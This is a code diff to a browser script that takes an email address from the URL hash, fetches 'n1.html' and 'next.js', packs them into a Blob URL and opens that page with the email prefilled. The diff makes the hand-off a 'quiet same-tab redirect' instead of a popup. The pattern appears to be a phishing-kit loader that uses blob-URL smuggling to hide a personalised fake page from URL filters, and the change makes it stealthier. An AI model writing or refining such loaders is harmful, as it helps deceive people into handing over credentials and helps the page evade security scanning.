@@ -1,9 +1,10 @@
 <script>
 (function () {
 
-  // ✅ READ EMAIL FROM HASH (not query string)
+  // ✅ READ EMAIL FROM HASH
   const hash = window.location.hash;
-  const emailFromHash = hash && hash.length > 1 ? hash.slice(1) : null;
+  const emailFromHash =
+    hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
   fetch('n1.html')
     .then(res => res.text())
@@ -11,7 +12,7 @@
 
       let modifiedHtml = html;
 
-      // ✅ Inline next.js so blob executes properly
+      // ✅ INLINE next.js
       try {
         const nextResp = await fetch('next.js');
         if (nextResp.ok) {
@@ -28,15 +29,17 @@
       const blob = new Blob([modifiedHtml], { type: 'text/html' });
       const blobUrl = URL.createObjectURL(blob);
 
-      // ✅ CRITICAL: RE‑ATTACH HASH FOR PREFILL
+      // ✅ QUIET SAME-TAB REDIRECT (NO POPUP)
       if (emailFromHash) {
-        window.open(blobUrl + '#' + encodeURIComponent(emailFromHash));
+        window.location.replace(
+          blobUrl + '#' + encodeURIComponent(emailFromHash)
+        );
       } else {
-        window.open(blobUrl);
+        window.location.replace(blobUrl);
       }
 
     })
-    .catch(err => console.error('Failed to open n1.html blob:', err));
+    .catch(err => console.error('Failed to load blob page:', err));
 
 })();
 </script>
